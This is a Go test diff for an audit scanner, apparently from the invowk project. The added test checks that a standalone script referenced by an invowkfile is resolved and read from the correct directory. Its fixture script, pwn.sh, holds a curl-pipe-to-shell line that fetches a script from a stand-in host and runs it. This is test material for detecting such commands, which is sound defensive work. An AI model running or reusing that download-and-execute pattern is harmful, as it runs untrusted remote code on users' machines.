@@ -5,6 +5,7 @@ package audit
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/invowk/invowk/internal/config"
@@ -83,6 +84,48 @@ func TestReadScriptFileFacts_BoundaryCheck(t *testing.T) {
 					tt.scriptPath, tt.modulePath, got, tt.want)
 			}
 		})
+	}
+}
+
+func TestBuildScanContextStandaloneFileScriptUsesInvowkfileDirectory(t *testing.T) {
+	root := t.TempDir()
+	otherDir := t.TempDir()
+	t.Chdir(otherDir)
+
+	scriptDir := filepath.Join(root, "scripts")
+	if err := os.MkdirAll(scriptDir, 0o755); err != nil {
+		t.Fatalf("MkdirAll(scriptDir) error = %v", err)
+	}
+	scriptContent := "#!/bin/sh\ncurl https://example.test/install.sh | sh"
+	if err := os.WriteFile(filepath.Join(scriptDir, "pwn.sh"), []byte(scriptContent), 0o644); err != nil {
+		t.Fatalf("WriteFile(script) error = %v", err)
+	}
+	invowkfilePath := filepath.Join(root, "invowkfile.cue")
+	if err := os.WriteFile(invowkfilePath, []byte(`cmds: [{
+	name: "install"
+	implementations: [{
+		script: "scripts/pwn.sh"
+		runtimes: [{name: "native"}]
+		platforms: [{name: "linux"}]
+	}]
+}]
+`), 0o644); err != nil {
+		t.Fatalf("WriteFile(invowkfile) error = %v", err)
+	}
+
+	sc, err := BuildScanContext(types.FilesystemPath(invowkfilePath), config.DefaultConfig(), false)
+	if err != nil {
+		t.Fatalf("BuildScanContext() error = %v", err)
+	}
+	scripts := sc.AllScripts()
+	if len(scripts) != 1 {
+		t.Fatalf("scripts = %d, want 1", len(scripts))
+	}
+	if !strings.Contains(scripts[0].Content(), "curl https://example.test/install.sh | sh") {
+		t.Fatalf("script content = %q, want standalone file content", scripts[0].Content())
+	}
+	if scripts[0].ScriptPath != types.FilesystemPath(filepath.Join(scriptDir, "pwn.sh")) {
+		t.Fatalf("ScriptPath = %q, want %q", scripts[0].ScriptPath, filepath.Join(scriptDir, "pwn.sh"))
 	}
 }
 
